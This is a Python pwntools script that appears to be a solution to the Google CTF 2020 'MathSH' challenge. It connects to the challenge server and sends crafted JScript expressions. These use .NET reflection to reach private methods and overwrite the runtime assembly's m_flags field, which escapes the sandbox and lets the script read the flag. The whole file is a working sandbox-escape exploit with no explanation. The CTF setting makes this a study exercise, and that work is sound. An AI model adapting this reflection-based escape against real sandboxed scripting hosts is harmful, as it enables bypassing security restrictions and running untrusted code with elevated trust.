#!/usr/bin/env python3
from pwn import *


def emit_null():
    return 'null'


def emit_bool(b):
    return 'true' if b else 'false'


def emit_string(expr):
    return '"' + expr.replace('"', '\\"') + '"'


def emit_eval(expr, target):
    return f'''eval({emit_string(expr)}, {target})'''


def emit_call(callable, *args):
    return f'''{callable}({', '.join(args)})'''


def emit_direct_method_call(object, method_name, *args):
    return emit_call(f'{object}.{method_name}', *args)


def emit_method_call(object, method_name, *args):
    return emit_eval(emit_call(method_name, *args), object)


def emit_field_access(object, field_name):
    return emit_eval(field_name, object)


def emit_type_delegator(name):
    return f'__global__.{name}'


def emit_type(name):
    return emit_field_access(emit_type_delegator(name), 'UnderlyingSystemType')


ENUM = emit_type_delegator('System.Enum')


def emit_enum_value(type, name):
    return emit_direct_method_call(ENUM, 'Parse', type, emit_string(name))


def emit_print(expr):
    return f'''memset({expr}, 0)'''


def emit_ctor(type, *args):
    return emit_call(type, *args)


def emit_array(*args):
    return emit_call('array', *args)


UTILS = emit_type_delegator('JScriptRunner.JScriptUtils')
ARG_TYPE_OBJECT = emit_string('')
ARG_TYPE_STRING = emit_string('')
ARG_TYPE_BOOL = emit_bool(False)
ARG_TYPE_ARRAY = emit_array()
ARG_TYPE_INT = '0'


def emit_utils_get_method(type, name, static_type, case_sensitive, non_public, arg_types):
    return emit_direct_method_call(
        UTILS,
        'GetMethod',
        type,
        emit_string(name),
        emit_bool(static_type),
        emit_bool(case_sensitive),
        emit_bool(non_public),
        emit_array(*arg_types),
    )


def emit_utils_call_method(method, target_object, args):
    return emit_direct_method_call(
        UTILS,
        'CallMethod',
        method,
        target_object,
        emit_array(*args),
    )


CALL_METHOD_SECURE = emit_utils_get_method(
    type=UTILS,
    name='CallMethodSecure',
    static_type=True,
    case_sensitive=False,
    non_public=True,
    arg_types=(ARG_TYPE_OBJECT, ARG_TYPE_STRING, ARG_TYPE_BOOL, ARG_TYPE_ARRAY),
)


def emit_utils_call_method_secure(target_object, name, *args):
    return emit_utils_call_method(
        method=CALL_METHOD_SECURE,
        target_object=emit_null(),
        args=(
            target_object,
            emit_string(name),
            emit_bool(False),  # case_sensitive
            emit_array(*args),
        ),
    )


def main():
    with remote('mathsh.2020.ctfcompetition.com', 1337) as tube:
        tube.recvuntil(b'MathSH> ')
        runtime_type = emit_type('System.RuntimeType')
        get_runtime_assembly = emit_utils_get_method(
            runtime_type,
            'GetRuntimeAssembly',
            static_type=False,
            case_sensitive=False,
            non_public=True,
            arg_types=(),
        )
        runtime_assembly = emit_utils_call_method_secure(
            get_runtime_assembly,
            'Invoke',
            emit_type('JScriptRunner.JScriptUtils'),
            emit_array(),
        )
        runtime_assembly_type = emit_type_delegator(
            'System.Reflection.RuntimeAssembly')
        assembly_flags_binding_flags = emit_enum_value(
            emit_type('System.Reflection.BindingFlags'), 'NonPublic, Instance')
        assembly_flags = emit_method_call(
            runtime_assembly_type,
            'GetField',
            emit_string('m_flags'),
            assembly_flags_binding_flags,
        )
        set_assembly_flags = emit_utils_call_method_secure(
            assembly_flags, 'SetValue', runtime_assembly, '0xffffffff')
        print('0< ' + set_assembly_flags)
        tube.sendline(set_assembly_flags)
        print('1> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        get_assembly_flags = emit_utils_call_method_secure(
            assembly_flags, 'GetValue', runtime_assembly)
        print_assembly_flags = emit_call(
            'memset', emit_string('assembly_flags'), get_assembly_flags)
        print('2< ' + print_assembly_flags)
        tube.sendline(print_assembly_flags)
        print('3> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        memlist = emit_call('memlist')
        print('4< ' + memlist)
        tube.sendline(memlist)
        print('5> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        flag = emit_ctor('__flag__')
        print('6< ' + flag)
        tube.sendline(flag)
        print('7> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())


if __name__ == '__main__':
    main()
